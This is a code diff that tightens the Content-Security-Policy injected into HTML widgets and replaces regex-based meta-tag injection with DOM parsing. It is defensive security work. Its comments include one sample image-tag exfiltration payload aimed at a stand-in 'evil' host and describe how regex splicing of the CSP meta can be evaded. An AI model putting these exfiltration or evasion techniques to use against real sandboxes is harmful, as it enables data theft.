@@ -259,12 +259,18 @@ const WIDGET_ASSET_ORIGINS = [
 /**
  * Content-Security-Policy shipped inside every widget document.
  *
- * Widgets are meant to be self-contained: inline HTML/CSS/JS plus the fonts and
- * (optionally) Chart.js/Reveal.js the skill documents. This policy enforces that
- * intent in the shipped frontend rather than relying on an external Caddy header
- * — it blocks network egress (`connect-src 'none'` stops fetch/XHR/WebSocket/
- * beacon exfil), pins remote scripts/styles/images/fonts to a trusted CDN
- * allowlist, and blocks form-based phishing exfil (`form-action 'none'`).
+ * Widgets are contractually self-contained (see the html-widget / mini-app
+ * skills: "no external dependencies unless truly necessary"; mini-apps have no
+ * `fetch`/`eval`/`Function`). This policy enforces that intent in the shipped
+ * frontend rather than relying on an external Caddy header:
+ *  - `connect-src 'none'` blocks fetch/XHR/WebSocket/beacon exfil;
+ *  - script/style/font are pinned to inline + the documented CDN allowlist;
+ *  - `img-src` intentionally omits arbitrary `https:` — a remote `<img>` is a
+ *    GET-exfil channel (`<img src="https://evil/x?"+data>`) that would undo
+ *    `connect-src 'none'`, and remote images aren't part of the contract;
+ *  - `'unsafe-eval'` is intentionally absent (mini-apps forbid eval/Function);
+ *  - `base-uri`/`form-action`/`frame-src 'none'` block base-hijack + phishing.
+ * `media-src data: blob:` allows inline (non-remote) audio/video.
  */
 const WIDGET_CSP = [
   "default-src 'none'",
@@ -272,6 +278,7 @@ const WIDGET_CSP = [
   `style-src 'unsafe-inline' https://fonts.googleapis.com ${WIDGET_ASSET_ORIGINS.join(" ")}`,
   `img-src data: blob: ${WIDGET_ASSET_ORIGINS.join(" ")}`,
   `font-src data: https://fonts.gstatic.com ${WIDGET_ASSET_ORIGINS.join(" ")}`,
+  "media-src data: blob:",
   "connect-src 'none'",
   "base-uri 'none'",
   "form-action 'none'",
@@ -283,26 +290,23 @@ const WIDGET_CSP_META = `<meta http-equiv="Content-Security-Policy" content="${W
 
 
 /**
- * Injects the widget CSP <meta> as the first child of <head> so it governs
- * every asset the document then loads. Falls back to the opening <html> tag or
- * the document start when no <head> is present. A document's own CSP still
- * applies; browsers enforce the intersection of all delivered policies, so this
- * can only tighten, never loosen, an author-supplied policy.
+ * Inject the widget CSP as the parser's FIRST head child so it governs every
+ * asset the document then loads. Uses a real HTML parser (not text splicing):
+ * regex splicing keyed to a `<head>` token is evadable — a `<head>` hidden in a
+ * comment makes the meta inert, and a resource appearing before `<head>` in
+ * source is hoisted ahead of a spliced meta. Parsing normalizes both: the
+ * comment stays a comment and `head.prepend` puts the meta before any hoisted
+ * resource. Browsers enforce the intersection of all delivered policies, so this
+ * can only tighten an author-supplied CSP.
  */
-const injectWidgetCsp = (html: string) => {
-  const headOpen = /<head[^>]*>/i.exec(html)
-  if (headOpen) {
-    const index = headOpen.index + headOpen[0].length
-    return `${html.slice(0, index)}\n    ${WIDGET_CSP_META}${html.slice(index)}`
-  }
-
-  const htmlOpen = /<html[^>]*>/i.exec(html)
-  if (htmlOpen) {
-    const index = htmlOpen.index + htmlOpen[0].length
-    return `${html.slice(0, index)}\n  <head>${WIDGET_CSP_META}</head>${html.slice(index)}`
-  }
-
-  return `${WIDGET_CSP_META}\n${html}`
+const injectWidgetCsp = (html: string): string => {
+  const doc = new DOMParser().parseFromString(html, "text/html")
+  const meta = doc.createElement("meta")
+  meta.setAttribute("http-equiv", "Content-Security-Policy")
+  meta.setAttribute("content", WIDGET_CSP)
+  doc.head.prepend(meta) // first-in-head, ahead of any parser-hoisted resource
+  const doctype = doc.doctype ? `<!DOCTYPE ${doc.doctype.name}>\n` : ""
+  return doctype + doc.documentElement.outerHTML
 }
 
 
